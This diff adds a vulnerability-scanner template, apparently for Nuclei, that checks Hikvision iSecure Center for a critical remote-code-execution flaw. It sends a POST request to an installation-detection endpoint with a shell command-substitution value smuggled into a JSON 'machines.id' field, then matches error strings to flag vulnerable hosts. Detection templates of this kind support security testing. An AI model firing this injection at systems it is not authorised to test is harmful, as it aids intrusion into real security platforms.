@@ -1,0 +1,30 @@
+id: hikvision-isecure-center-machines-rce
+
+info:
+  name: Hikvision iSecure Center machines id RCE
+  author: SleepingBag945
+  severity: critical
+  description: |
+    海康威视综合安防管理平台RCE
+  tags: rce
+
+http:
+  - raw:
+      - |
+        POST /center/api/installation/detection HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+
+        {"type":"environment",
+        "operate":"",
+        "machines":{"id":"$()"}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '0x00137293'
+          - '服务器不在线'
+        condition: and
